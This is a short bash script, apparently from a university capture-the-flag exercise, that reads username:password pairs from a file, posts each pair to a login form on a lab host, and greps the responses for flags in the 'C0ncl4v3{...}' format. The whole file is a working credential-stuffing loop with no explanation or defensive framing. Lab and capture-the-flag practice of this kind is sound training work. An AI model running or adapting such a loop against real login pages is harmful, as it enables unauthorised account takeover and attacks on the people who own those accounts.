#!/bin/bash
touch respuesta.txt
res=""
while IFS= read -r line; do
    username=$(echo "$line" | cut -d':' -f1)
    password=$(echo "$line" | cut -d':' -f2)
    res=$(curl -X POST \
        -d "username=$username&pass=$password" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        http://baymax.tlm.unavarra.es:42144/ | grep -o 'C0ncl4v3{[^}]*}')
    echo $res >> respuesta.txt
done < logins.txt
